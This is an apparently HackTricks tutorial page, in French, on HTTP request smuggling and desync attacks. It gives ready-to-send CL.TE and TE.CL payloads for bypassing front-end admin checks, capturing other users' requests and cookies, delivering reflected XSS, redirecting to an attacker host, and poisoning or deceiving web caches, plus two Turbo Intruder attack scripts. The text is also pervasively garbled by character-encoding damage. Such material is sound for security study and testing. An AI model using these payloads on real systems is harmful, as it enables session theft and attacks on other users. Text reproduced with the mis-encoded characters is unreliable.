# Attaque de Smuggling de RequÃªte HTTP / Attaque de DÃ©synchronisation HTTP

<details>

<summary><strong>Apprenez le piratage AWS de zÃ©ro Ã  hÃ©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en Ã©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres faÃ§ons de soutenir HackTricks :

- Si vous souhaitez voir votre **entreprise annoncÃ©e dans HackTricks** ou **tÃ©lÃ©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
- DÃ©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Rejoignez le** ğŸ’¬ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
- **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dÃ©pÃ´ts GitHub.

</details>

## Qu'est-ce que c'est

Cette vulnÃ©rabilitÃ© se produit lorsqu'une **dÃ©synchronisation** entre les **proxys frontaux** et le **serveur back-end** permet Ã  un **attaquant** d'**envoyer** une **requÃªte HTTP** qui sera **interprÃ©tÃ©e** comme une **seule requÃªte** par les **proxys frontaux** (Ã©quilibrage de charge/proxy inverse) et **comme 2 requÃªtes** par le **serveur back-end**.\
Cela permet Ã  un utilisateur de **modifier la prochaine requÃªte qui arrive au serveur back-end aprÃ¨s la sienne**.

### ThÃ©orie

[**SpÃ©cification RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Si un message est reÃ§u avec Ã  la fois un champ d'en-tÃªte Transfer-Encoding et un champ d'en-tÃªte Content-Length, ce dernier DOIT Ãªtre ignorÃ©.

**Content-Length**

> L'en-tÃªte d'entitÃ© Content-Length indique la taille du corps de l'entitÃ©, en octets, envoyÃ© au destinataire.

**Transfer-Encoding: chunked**

> L'en-tÃªte Transfer-Encoding spÃ©cifie la forme de codage utilisÃ©e pour transfÃ©rer en toute sÃ©curitÃ© le corps de la charge utile Ã  l'utilisateur.\
> Chunked signifie que de grandes donnÃ©es sont envoyÃ©es sous forme de sÃ©ries de morceaux.

### RÃ©alitÃ©

Le **Front-End** (un Ã©quilibreur de charge / Proxy Inverse) **traite** l'en-tÃªte _**content-length**_ ou l'en-tÃªte _**transfer-encoding**_ et le **serveur Back-end** **traite l'autre** provoquant une **dÃ©synchronisation** entre les 2 systÃ¨mes.\
Cela pourrait Ãªtre trÃ¨s critique car **un attaquant pourra envoyer une requÃªte** au proxy inverse qui sera **interprÃ©tÃ©e** par le **serveur back-end comme 2 requÃªtes diffÃ©rentes**. Le **danger** de cette technique rÃ©side dans le fait que le **serveur back-end interprÃ©tera la 2Ã¨me requÃªte injectÃ©e** comme si elle **venait du prochain client** et la **vraie requÃªte** de ce client fera **partie** de la **requÃªte injectÃ©e**.

### ParticularitÃ©s

Rappelez-vous qu'en HTTP **un caractÃ¨re de nouvelle ligne est composÃ© de 2 octets :**

- **Content-Length** : Cet en-tÃªte utilise un **nombre dÃ©cimal** pour indiquer le **nombre d'octets** du **corps** de la requÃªte. Le corps est censÃ© se terminer par le dernier caractÃ¨re, **une nouvelle ligne n'est pas nÃ©cessaire Ã  la fin de la requÃªte**.
- **Transfer-Encoding** : Cet en-tÃªte utilise dans le **corps** un **nombre hexadÃ©cimal** pour indiquer le **nombre d'octets** du **prochain chunk**. Le **chunk** doit se **terminer** par une **nouvelle ligne** mais cette nouvelle ligne **n'est pas comptÃ©e** par l'indicateur de longueur. Cette mÃ©thode de transfert doit se terminer par un **chunk de taille 0 suivi de 2 nouvelles lignes** : `0`
- **Connection** : D'aprÃ¨s mon expÃ©rience, il est recommandÃ© d'utiliser **`Connection: keep-alive`** sur la premiÃ¨re requÃªte de Smuggling de requÃªte.

## Exemples de Base

Ainsi, les attaques de smuggling de requÃªte impliquent de placer Ã  la fois l'en-tÃªte `Content-Length` et l'en-tÃªte `Transfer-Encoding` dans une seule requÃªte HTTP et de les manipuler de maniÃ¨re Ã  ce que les serveurs frontaux et back-end traitent la requÃªte diffÃ©remment. La maniÃ¨re exacte dont cela est fait dÃ©pend du comportement des deux serveurs :

- **CL.TE** : le serveur frontal utilise l'en-tÃªte `Content-Length` et le serveur back-end utilise l'en-tÃªte `Transfer-Encoding`.
- **TE.CL** : le serveur frontal utilise l'en-tÃªte `Transfer-Encoding` et le serveur back-end utilise l'en-tÃªte `Content-Length`.
- **TE.TE** : les serveurs frontal et back-end prennent en charge tous deux l'en-tÃªte `Transfer-Encoding`, mais l'un des serveurs peut Ãªtre amenÃ© Ã  ne pas le traiter en obfusquant l'en-tÃªte d'une maniÃ¨re ou d'une autre.

### VulnÃ©rabilitÃ©s CL.TE

Ici, le serveur **frontal** utilise l'en-tÃªte **`Content-Length`** et le serveur **back-end** utilise l'en-tÃªte **`Transfer-Encoding`**. Nous pouvons effectuer une attaque de Smuggling de requÃªte HTTP simple comme suit :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

Remarquez comment `Content-Length` indique que la **longueur de la requÃªte est de 30 octets** (_rappelez-vous qu'en HTTP, une nouvelle ligne est de 2 octets_), donc le proxy inverse **enverra la requÃªte complÃ¨te** au back-end, et le back-end traitera l'en-tÃªte `Transfer-Encoding` laissant `GET /404 HTTP/1.1` comme **dÃ©but de la prochaine requÃªte** (au fait, la prochaine requÃªte sera ajoutÃ©e Ã  `Foo:x<DÃ©but de la prochaine requÃªte>`).

### VulnÃ©rabilitÃ©s TE.CL

Ici, le serveur frontal utilise l'en-tÃªte `Transfer-Encoding` et le serveur back-end utilise l'en-tÃªte `Content-Length`. Nous pouvons effectuer une attaque de Smuggling de requÃªte HTTP simple comme suit :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

Dans ce cas, le **proxy inverse** enverra **toute la requÃªte** au **back-end** comme indiquÃ© par le **`Transfer-encoding`**. Mais, le **back-end** va **traiter** seulement le **`7b`** (4 octets) comme indiquÃ© dans le `Content-Length`. Par consÃ©quent, la prochaine requÃªte sera celle commenÃ§ant par `GET /404 HTTP/1.1`

_Notez que mÃªme si l'attaque doit se terminer par un `0`, la requÃªte suivante sera ajoutÃ©e comme valeurs supplÃ©mentaires du paramÃ¨tre **x**._\
_Notez Ã©galement que le Content-Length de la requÃªte intÃ©grÃ©e indiquera la longueur de la prochaine requÃªte qui sera ajoutÃ©e au paramÃ¨tre **x**. Si elle est trop petite, seuls quelques octets seront ajoutÃ©s, et si elle est trop grande (plus grande que la longueur de la prochaine requÃªte), une erreur sera gÃ©nÃ©rÃ©e pour la prochaine requÃªte._

### VulnÃ©rabilitÃ©s TE.TE

Ici, les serveurs frontal et back-end prennent en charge tous deux l'en-tÃªte `Transfer-Encoding`, mais l'un des serveurs peut Ãªtre amenÃ© Ã  ne pas le traiter en obfusquant l'en-tÃªte d'une maniÃ¨re ou d'une autre.\
Il existe potentiellement d'innombrables faÃ§ons d'obfusquer l'en-tÃªte `Transfer-Encoding`. Par exemple :

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[espace]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

En fonction du serveur (proxy inverse ou de sauvegarde) qui **arrÃªte de traiter** l'en-tÃªte **TE**, vous trouverez une **vulnÃ©rabilitÃ© CL.TE** ou une **vulnÃ©rabilitÃ© TE.CL**.

## Trouver le Smuggling de RequÃªte HTTP

### Trouver des vulnÃ©rabilitÃ©s CL.TE en utilisant des techniques de temporisation

Si une application est vulnÃ©rable Ã  la variante CL.TE du smuggling de requÃªte, alors l'envoi d'une requÃªte comme celle-ci provoquera souvent un retard de temps :
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
Depuis que le serveur frontal utilise l'en-tÃªte `Content-Length`, il ne transmettra qu'une partie de cette requÃªte, en omettant le `0`. Le serveur arriÃ¨re utilise l'en-tÃªte `Transfer-Encoding`, traite le premier fragment, puis attend l'arrivÃ©e du fragment suivant. Cela entraÃ®nera un retard observable.

Parfois, au lieu d'obtenir un dÃ©lai d'expiration, vous recevez une mauvaise demande 400 de l'hÃ´te final comme dans le scÃ©nario suivant, oÃ¹ une charge utile CL.TE est envoyÃ©e :

![](<../../.gitbook/assets/image (444).png>)

Et la rÃ©ponse est une redirection contenant une erreur dans le corps avec mÃªme la version de haproxy utilisÃ©e :

![](<../../.gitbook/assets/image (443).png>)

### Recherche de vulnÃ©rabilitÃ©s TE.CL en utilisant des techniques de synchronisation

Si une application est vulnÃ©rable Ã  la variante TE.CL du dÃ©tournement de requÃªte, l'envoi d'une requÃªte comme celle-ci provoquera souvent un retard temporel :
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
### Sonder les vulnÃ©rabilitÃ©s de la requÃªte HTTP Smuggling

Une fois que vous avez constatÃ© que les **techniques de synchronisation fonctionnent**, vous devez **sonder** si vous pouvez **modifier les requÃªtes des autres clients**.\
La maniÃ¨re la plus simple de le faire est d'essayer de corrompre vos propres requÃªtes, **faire une requÃªte pour `/` renvoyer par exemple un code 404**.\
Dans les [Exemples de base](./#basic-examples), nous avons dÃ©jÃ  vu des exemples `CL.TE` et `TE.CL` de comment corrompre une requÃªte de client pour demander `/404` provoquant une rÃ©ponse 404 lorsque le client demandait une autre ressource.

**Remarques**

Quelques considÃ©rations importantes doivent Ãªtre prises en compte lors de la tentative de confirmation des vulnÃ©rabilitÃ©s de la requÃªte de smuggling via l'interfÃ©rence avec d'autres requÃªtes :

* La requÃªte "d'attaque" et la requÃªte "normale" doivent Ãªtre envoyÃ©es au serveur en utilisant des connexions rÃ©seau diffÃ©rentes. Envoyer les deux requÃªtes via la mÃªme connexion ne prouvera pas que la vulnÃ©rabilitÃ© existe.
* La requÃªte "d'attaque" et la requÃªte "normale" doivent utiliser la mÃªme URL et les mÃªmes noms de paramÃ¨tres, autant que possible. Cela est dÃ» au fait que de nombreuses applications modernes routent les requÃªtes frontales vers diffÃ©rents serveurs back-end en fonction de l'URL et des paramÃ¨tres. Utiliser la mÃªme URL et les mÃªmes paramÃ¨tres augmente la chance que les requÃªtes soient traitÃ©es par le mÃªme serveur back-end, ce qui est essentiel pour que l'attaque fonctionne.
* Lors de la vÃ©rification de la requÃªte "normale" pour dÃ©tecter toute interfÃ©rence de la requÃªte "d'attaque", vous Ãªtes en concurrence avec d'autres requÃªtes que l'application reÃ§oit en mÃªme temps, y compris celles d'autres utilisateurs. Vous devez envoyer la requÃªte "normale" immÃ©diatement aprÃ¨s la requÃªte "d'attaque". Si l'application est occupÃ©e, vous pourriez avoir besoin de plusieurs tentatives pour confirmer la vulnÃ©rabilitÃ©.
* Dans certaines applications, le serveur frontal fonctionne comme un Ã©quilibreur de charge et transfÃ¨re les requÃªtes vers diffÃ©rents systÃ¨mes back-end selon un algorithme d'Ã©quilibrage de charge. Si vos requÃªtes "d'attaque" et "normale" sont transfÃ©rÃ©es vers diffÃ©rents systÃ¨mes back-end, alors l'attaque Ã©chouera. C'est une raison supplÃ©mentaire pour laquelle vous pourriez avoir besoin d'essayer plusieurs fois avant de confirmer une vulnÃ©rabilitÃ©.
* Si votre attaque rÃ©ussit Ã  interfÃ©rer avec une requÃªte ultÃ©rieure, mais que ce n'Ã©tait pas la requÃªte "normale" que vous avez envoyÃ©e pour dÃ©tecter l'interfÃ©rence, cela signifie qu'un autre utilisateur de l'application a Ã©tÃ© affectÃ© par votre attaque. Si vous continuez le test, cela pourrait avoir un effet perturbateur sur d'autres utilisateurs, et vous devriez faire preuve de prudence.

### Forcer via les en-tÃªtes hop-by-hop

En abusant des en-tÃªtes hop-by-hop, vous pourriez indiquer au proxy de **supprimer l'en-tÃªte Content-Length ou Transfer-Encoding pour qu'une requÃªte HTTP smuggling soit possible Ã  exploiter**.
```
Connection: Content-Length
```
Pour **plus d'informations sur les en-tÃªtes hop-by-hop**, visitez :

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Abus de la manipulation des requÃªtes HTTP

### Pour contourner les contrÃ´les de sÃ©curitÃ© cÃ´tÃ© front-end

Parfois, les **proxys cÃ´tÃ© front-end effectueront des vÃ©rifications de sÃ©curitÃ©**. Vous pouvez les Ã©viter en abusant de la manipulation des requÃªtes HTTP car vous pourrez **contourner les protections**. Par exemple, dans cet exemple, vous **ne pouvez pas accÃ©der Ã  `/admin` depuis l'extÃ©rieur** et le proxy cÃ´tÃ© front-end vÃ©rifie cela, mais ce **proxy ne vÃ©rifie pas la requÃªte intÃ©grÃ©e** :

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### RÃ©vÃ©ler la rÃ©Ã©criture des requÃªtes cÃ´tÃ© front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Dans de nombreuses applications, le **serveur cÃ´tÃ© front-end effectue une rÃ©Ã©criture des requÃªtes** avant de les transmettre au serveur cÃ´tÃ© back-end, gÃ©nÃ©ralement en ajoutant quelques en-tÃªtes de requÃªte supplÃ©mentaires.\
Une chose courante Ã  faire est d'**ajouter Ã  la requÃªte l'en-tÃªte** `X-Forwarded-For: <IP du client>` ou un en-tÃªte similaire pour que le back-end connaisse l'IP du client.\
Parfois, si vous pouvez **trouver quelles nouvelles valeurs sont ajoutÃ©es** Ã  la requÃªte, vous pourriez Ãªtre en mesure de **contourner les protections** et **accÃ©der Ã  des informations/endpoints cachÃ©s**.

Pour dÃ©couvrir comment le proxy rÃ©Ã©crit la requÃªte, vous devez **trouver un paramÃ¨tre POST que le back-end reflÃ©tera sa valeur** dans la rÃ©ponse. Ensuite, utilisez ce paramÃ¨tre en dernier et utilisez une exploitation comme celle-ci :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

Dans ce cas, la prochaine requÃªte sera ajoutÃ©e aprÃ¨s `search=`, qui est Ã©galement **le paramÃ¨tre dont la valeur va Ãªtre reflÃ©tÃ©e** dans la rÃ©ponse, donc elle va **reflÃ©ter les en-tÃªtes de la prochaine requÃªte**.

Notez que **seule la longueur indiquÃ©e dans l'en-tÃªte `Content-Length` de la requÃªte intÃ©grÃ©e va Ãªtre reflÃ©tÃ©e**. Si vous utilisez un petit nombre, seuls quelques octets seront reflÃ©tÃ©s, si vous utilisez un nombre plus grand que la longueur de tous les en-tÃªtes, alors la requÃªte intÃ©grÃ©e renverra une erreur. Ensuite, vous devriez **commencer** par un **petit nombre** et **l'augmenter** jusqu'Ã  ce que vous voyiez tout ce que vous vouliez voir.\
Notez Ã©galement que cette **technique est Ã©galement exploitable avec une vulnÃ©rabilitÃ© TE.CL** mais la requÃªte doit se terminer par `search=\r\n0`. Cependant, indÃ©pendamment des caractÃ¨res de nouvelle ligne, les valeurs seront ajoutÃ©es au paramÃ¨tre de recherche.

Enfin, notez que dans cette attaque, nous attaquons toujours nous-mÃªmes pour apprendre comment le proxy cÃ´tÃ© front-end rÃ©Ã©crit la requÃªte.

### Capturer les requÃªtes d'autres utilisateurs <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Si vous trouvez une requÃªte POST qui va enregistrer le contenu de l'un des paramÃ¨tres, vous pouvez ajouter la requÃªte suivante en tant que valeur de ce paramÃ¨tre afin de stocker la requÃªte du prochain client :

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

Dans ce cas, la valeur du **paramÃ¨tre commentaire** va Ãªtre **enregistrÃ©e dans un commentaire** d'un post sur la page qui est **publiquement disponible**, donc un **commentaire apparaÃ®tra avec le contenu de la prochaine requÃªte**.

_Une limitation de cette technique est qu'elle capture gÃ©nÃ©ralement des donnÃ©es jusqu'au dÃ©limiteur de paramÃ¨tre applicable pour la requÃªte trafiquÃ©e. Pour les soumissions de formulaires encodÃ©es en URL, ce sera le caractÃ¨re `&`, ce qui signifie que le contenu stockÃ© de la requÃªte de l'utilisateur victime se terminera au premier `&`, qui pourrait mÃªme apparaÃ®tre dans la chaÃ®ne de requÃªte._

Notez Ã©galement que cette **technique est Ã©galement exploitable avec une vulnÃ©rabilitÃ© TE.CL** mais la requÃªte doit se terminer par `search=\r\n0`. Cependant, indÃ©pendamment des caractÃ¨res de nouvelle ligne, les valeurs seront ajoutÃ©es au paramÃ¨tre de recherche.

### Utilisation de la manipulation des requÃªtes HTTP pour exploiter les XSS rÃ©flÃ©chis

Si la page web est Ã©galement **vulnÃ©rable aux XSS rÃ©flÃ©chis**, vous pouvez abuser de la manipulation des requÃªtes HTTP pour attaquer les clients du web. L'exploitation des XSS rÃ©flÃ©chis Ã  partir de la manipulation des requÃªtes HTTP prÃ©sente certains avantages :

* **Elle ne nÃ©cessite aucune interaction avec les utilisateurs victimes**
* Elle peut Ãªtre utilisÃ©e pour **exploiter** le comportement XSS dans des parties de la requÃªte qui **ne peuvent pas Ãªtre contrÃ´lÃ©es de maniÃ¨re triviale dans une attaque XSS rÃ©flÃ©chie normale**, comme les en-tÃªtes de requÃªte HTTP.

Si un site web est vulnÃ©rable aux XSS rÃ©flÃ©chis sur l'en-tÃªte User-Agent, vous pouvez utiliser cette charge utile pour l'exploiter :

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### Utilisation de la manipulation des requÃªtes HTTP pour transformer une redirection sur site en une redirection ouverte <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

De nombreuses applications effectuent des redirections sur site d'une URL Ã  une autre et placent le nom d'hÃ´te de l'en-tÃªte `Host` de la requÃªte dans l'URL de redirection. Un exemple de cela est le comportement par dÃ©faut des serveurs web Apache et IIS, oÃ¹ une requÃªte pour un dossier sans barre oblique finale reÃ§oit une redirection vers le mÃªme dossier incluant la barre oblique finale :

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

Ce comportement est gÃ©nÃ©ralement considÃ©rÃ© comme inoffensif, mais il peut Ãªtre exploitÃ© dans une attaque de manipulation des requÃªtes pour rediriger d'autres utilisateurs vers un domaine externe. Par exemple :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

La requÃªte trafiquÃ©e dÃ©clenchera une redirection vers le site web de l'attaquant, ce qui affectera la requÃªte du prochain utilisateur traitÃ©e par le serveur cÃ´tÃ© back-end. Par exemple :

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

Ici, la requÃªte de l'utilisateur Ã©tait pour un fichier JavaScript qui Ã©tait importÃ© par une page du site web. L'attaquant peut compromettre complÃ¨tement l'utilisateur victime en renvoyant son propre JavaScript dans la rÃ©ponse.

### Utilisation de la manipulation des requÃªtes HTTP pour effectuer un empoisonnement de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

Si une partie de l'**infrastructure cÃ´tÃ© front-end effectue la mise en cache du contenu** (gÃ©nÃ©ralement pour des raisons de performance), il **pourrait Ãªtre possible de polluer cette cache en modifiant la rÃ©ponse du serveur**.

Nous avons dÃ©jÃ  vu comment modifier la valeur renvoyÃ©e attendue par le serveur vers un 404 (dans les [Exemples de base](./#basic-examples)), de maniÃ¨re similaire, vous pourriez faire en sorte que le serveur renvoie le contenu de /index.html lorsque la requÃªte empoisonnÃ©e demande `/static/include.js`. De cette maniÃ¨re, le contenu de `/static/include.js` sera mis en cache avec le contenu de `/index.html`, rendant `/static/include.js` inaccessible aux clients (DoS?).

Remarquez que c'est encore plus intÃ©ressant si vous trouvez une **Redirection Ouverte** ou une **redirection sur site vers une redirection ouverte** (derniÃ¨re section). Parce que, vous pourriez Ãªtre en mesure de **changer les valeurs de cache** de `/static/include.js` avec celles d'un script contrÃ´lÃ© par vous (crÃ©ant un **XSS gÃ©nÃ©ral pour tous les clients** qui essaient de tÃ©lÃ©charger la nouvelle version de `/static/include.js`).

Dans cet exemple, il sera montrÃ© comment vous pouvez exploiter un **empoisonnement de cache + une redirection sur site vers une redirection ouverte** pour modifier le contenu du cache de `/static/include.js` pour **servir du code JS contrÃ´lÃ©** par l'attaquant :

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

Notez comment la requÃªte intÃ©grÃ©e demande `/post/next?postId=3`. Cette requÃªte sera redirigÃ©e vers `/post?postId=4` et **utilisera la valeur de l'en-tÃªte Host** pour indiquer le domaine. Par consÃ©quent, vous pouvez **modifier l'en-tÃªte Host** pour pointer vers le serveur de l'attaquant et la redirection utilisera ce domaine (**redirection sur site vers une redirection ouverte**).

Ensuite, **aprÃ¨s avoir empoisonnÃ© le socket**, vous devez envoyer une **requÃªte GET** Ã  \*\*`/static/include.js`\*\*cette requÃªte sera **empoisonnÃ©e** par la requÃªte **de redirection sur site vers une redirection ouverte** et **rÃ©cupÃ©rera le contenu du script contrÃ´lÃ© par l'attaquant**.

La prochaine fois que quelqu'un demandera `/static/include.js`, le contenu mis en cache du script de l'attaquant sera servi (XSS gÃ©nÃ©ral).

### Utilisation de la manipulation des requÃªtes HTTP pour effectuer une duperie de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Quelle est la diffÃ©rence entre l'empoisonnement de cache web et la duperie de cache web ?**
>
> * Dans l'**empoisonnement de cache web**, l'attaquant fait en sorte que l'application stocke un contenu malveillant dans le cache, et ce contenu est servi Ã  partir du cache Ã  d'autres utilisateurs de l'application.
> * Dans la **duperie de cache web**, l'attaquant fait en sorte que l'application stocke un contenu sensible appartenant Ã  un autre utilisateur dans le cache, puis l'attaquant rÃ©cupÃ¨re ce contenu du cache.

Dans cette variante, l'attaquant trafique une requÃªte qui renvoie un contenu sensible spÃ©cifique Ã  un utilisateur. Par exemple :

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`

Si le **poison atteint un client qui accÃ©dait Ã  un contenu statique** comme `/someimage.png` qui allait Ãªtre **mis en cache**. Le contenu de `/private/messages` de la victime sera mis en cache dans `/someimage.png` et l'attaquant pourra les voler.\
Notez que l'**attaquant ne sait pas quel contenu statique la victime essayait d'accÃ©der** donc probablement la meilleure faÃ§on de tester cela est de rÃ©aliser l'attaque, d'attendre quelques secondes et de **charger tous** les contenus statiques et de **rechercher les donnÃ©es privÃ©es**.

### Armer la manipulation des requÃªtes HTTP avec la dÃ©synchronisation des rÃ©ponses HTTP

Avez-vous trouvÃ© une vulnÃ©rabilitÃ© de manipulation des requÃªtes HTTP et vous ne savez pas comment l'exploiter. Essayez cette autre mÃ©thode d'exploitation :

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts Turbo Intruder

### CL.TE

Depuis [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De : [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Plus d'informations

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[Image provenant d'ici.](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## Outils

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
